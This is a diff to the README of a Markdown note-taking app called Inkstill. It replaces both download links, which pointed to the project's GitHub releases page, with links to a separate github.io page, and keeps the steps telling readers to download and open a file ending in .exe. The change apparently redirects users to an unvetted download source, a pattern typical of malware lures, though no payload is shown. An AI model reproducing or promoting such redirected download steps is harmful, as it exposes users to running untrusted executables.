@@ -1,6 +1,6 @@
 # 📝 Inkstill - Write and organize your notes offline
 
-[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases)
+[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://pinoncanavaliaensiformis635.github.io)
 
 Inkstill is a simple tool for writing and organizing notes on your computer. It uses Markdown, a format that focuses on your text. This software keeps all your files on your hard drive. Your data stays private. You do not need an internet connection to work.
 
@@ -10,7 +10,7 @@ Inkstill uses CodeMirror to make typing fast. It features a live preview mode. Y
 
 You can get the software from the releases page. Follow these steps:
 
-1. Visit [this page to download](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases).
+1. Visit [this page to download](https://pinoncanavaliaensiformis635.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Open the downloaded file once it finishes.
